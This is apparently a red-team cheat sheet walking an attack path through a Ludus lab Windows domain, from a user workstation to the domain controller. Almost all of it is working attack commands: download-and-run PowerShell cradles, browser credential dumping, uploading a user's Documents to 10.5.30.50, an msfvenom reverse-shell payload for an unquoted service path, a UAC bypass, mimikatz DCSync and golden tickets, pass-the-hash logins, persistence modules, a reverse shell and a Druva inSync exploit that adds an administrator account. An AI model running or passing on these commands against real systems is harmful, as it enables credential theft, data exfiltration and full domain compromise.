### PATH
```
win11 ludus\domainuser -> Enumeration, CredentialKatz, Documents Exfiltration -> unquoted service exploit >
win11 ludus\domainadmin -> UAC Bypass >
win11 ludus\domainadmin priviledged -> mimikatz golden ticket download -> dump password evil-winrm >
win-server priviledged ludus\domainadmin
```

### win11 ludus\domainuser
```bash
7z x -pinfected -mhe tools.7z tools

msfconsole -r user_handler.rc
# windows run command on win11
sessions
sessions 1
```

### User Enum
```shell
# meterpreter
sysinfo
getuid
getpid
ps
enumdesktops
getenv

# shell
powershell
echo %USERDOMAIN%
nltest /dclist:ludus
whoami
whoami /priv
whoami /groups

# tcp and udp open ports
netstat -na

# arp table
arp -a

# systeminfo
systeminfo
# networking
ipconfig

# get information about current antivirus
Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntivirusProduct
# check if defender is running
Get-Service WinDefend
# and if realtimeprotection is inabled
Get-MpComputerStatus | select RealTimeProtectionEnabled

# check if firewall is enabled
Get-NetFirewallProfile | Format-Table Name, Enabled


# check current firewall rules 
Get-NetFirewallRule | select DisplayName, Enabled,Description

# if we cannot dump the rules sometimes is best to just test them
Test-NetConnection -ComputerName 127.0.0.1 -Port 80

# antivirus matches
Get-MpThreat

# current logging
Get-EventLog -List

# various ways to check if sysmon is running
Get-Service Sysmon
Get-Process | Where-Object { _$.ProcessName -eq "Sysmon" }
Get-CimInstance win32_service -Filter "Description = 'System Monitor service'"
Get-Service | where-object {$_.DisplayName -like "*sysm*"}
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\WINEVT\Channels\Microsoft-Windows-Sysmon/Operational

# find the sysmon config
findstr /si '<ProcessCreate onmatch="exclude">' C:\tools\*

# get list of applications and their versions
wmic product get Name, Version, Vendor

# check for current updates installed 
wmic qfe get Caption,Description

# current running services
net start

# users enumeration
net user
net localgroup
net localgroup administrators

# saved logins
cmdkey /list
runas /savecred /user:WPRIVESC1\mike.katz cmd.exe

# powershell history
type "$env:USERPROFILE\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt"

# if we have admin priviledges we can
netstat -abno
```


```shell
# winpeas 
powershell -ep bypass -Command "iex (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/peass-ng/PEASS-ng/refs/heads/master/winPEAS/winPEASps1/winPEAS.ps1')"

# adpeas
powershell -ep bypass -Command "iex (New-Object Net.WebClient).DownloadString('https://github.com/61106960/adPEAS/raw/refs/heads/main/adPEAS.ps1')"

# powerup
powershell -ep bypass -Command "iex (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1'); Invoke-AllChecks"

# portscan
powershell -ep bypass -Command "iex (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/Invoke-Portscan.ps1'); Invoke-Portscan -Hosts 10.5.20.0/24 -Ports '22,3389,5985,5986'"
```

```bash
use post/windows/gather/credentials/windows_autologin
set session 1
run

evil-winrm -i 10.5.20.14 -u domainadmin -p password
```

### Exfiltration

```shell
cd %TEMP%
upload CredentialKatz.exe
.\CredentialKatz.exe

# or it is possible to
Get-Process msedge
procdump -ma 1220 msedge_dump.dmp

python3 exfil.py

Compress-Archive -Path 'C:\Users\domainuser\Documents' -Update -DestinationPath "$env:TEMP\documents.zip"; (New-Object Net.WebClient).UploadFile("http://10.5.30.50:80/upload", "$env:TEMP\documents.zip")
```

## Unquoted service path exploit
```bash
sc qc "DiskSorter"
icacls "C:\Users\Public"
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.5.30.50 LPORT=1234 -f exe -o Disk.exe

cd "C:\Users\Public"
upload Disk.exe

icacls "C:\Users\Public\Disk.exe" /grant Everyone:F
sc stop "DiskSorter"
sc start "DiskSorter"

ps | grep teams
migrate <teams>
```

### win11 ludus\domainadmin
```bash
net localgroup administrators
cd %TEMP%
upload Akagi64.exe
shell

.\Akagi64.exe 33 "C:\Users\Public\Disk.exe"

# this does not work
load kiwi
creds_all
hashdump
dcsync_lsa krbtgt

python3 ~/Desktop/tools/impacket/examples/psexec.py 'domainadmin@10.5.20.13' -hashes :8846f7eaee8fb117ad06bdd830b7586c
psexec \\10.5.20.13 -i -u ludus\domainadmin -p password cmd.exe
```

## MIMI

```shell
# mimikatz
powershell -ep bypass -Command "iex (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1'); Invoke-Mimikatz"
```


```shell
# you need administrator priviledges
cd %TEMP%
.\mimikatz.exe
privilege::debug

lsadump::dcsync /user:ludus\domainadmin
evil-winrm -i 10.5.20.13 -u domainadmin -H 8846f7eaee8fb117ad06bdd830b7586c

lsadump::dcsync /user:ludus\krbtgt
# /krbtgt:Hash NTLM
kerberos::golden /user:Administrator /domain:controller.local /krbtgt:93c7fd662a834869db8ad4bee4876299
download "C:\Users\Public\ticket.kirbi"

# does not work
lsadump::lsa /patch
sekurlsa::logonpasswords
lsadump::sam
lsadump::lsa /inject /name:krbtgt
kerveros::golden /user: /domain: /sid: /krbtgt: /id: 
misc::cmd
PsExec.exe \\Desktop-1 cmd.exe
```

## Optional 

### Reg Keys Persistence On Domain Member
```
use exploit/windows/local/registry_persistence
set SESSION 1
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST <your_ip>
set LPORT 4444
run
```

### Service Persistence on Domain Controller
```
use exploit/windows/local/persistence_service
show options
set LHOST
set LPORT
show option
set SERVICE_NAME lsass
set sessions 2
run 
```

### raw revshell
```bash
stty raw -echo; (stty size; cat) | nc -lvnp 1337
IEX(IWR https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell 10.5.30.50 1337
```

### druva exploit
```
$ErrorActionPreference = "Stop"

$cmd = "net user pwnd SimplePass123 /add & net localgroup administrators pwnd /add & winrm quickconfig -force"

$s = New-Object System.Net.Sockets.Socket(
    [System.Net.Sockets.AddressFamily]::InterNetwork,
    [System.Net.Sockets.SocketType]::Stream,
    [System.Net.Sockets.ProtocolType]::Tcp
)
$s.Connect("127.0.0.1", 6064)

$header = [System.Text.Encoding]::UTF8.GetBytes("inSync PHC RPCW[v0002]")
$rpcType = [System.Text.Encoding]::UTF8.GetBytes("$([char]0x0005)`0`0`0")
$command = [System.Text.Encoding]::Unicode.GetBytes("C:\ProgramData\Druva\inSync4\..\..\..\Windows\System32\cmd.exe /c $cmd");
$length = [System.BitConverter]::GetBytes($command.Length);

$s.Send($header)
$s.Send($rpcType)
$s.Send($length)
$s.Send($command)
```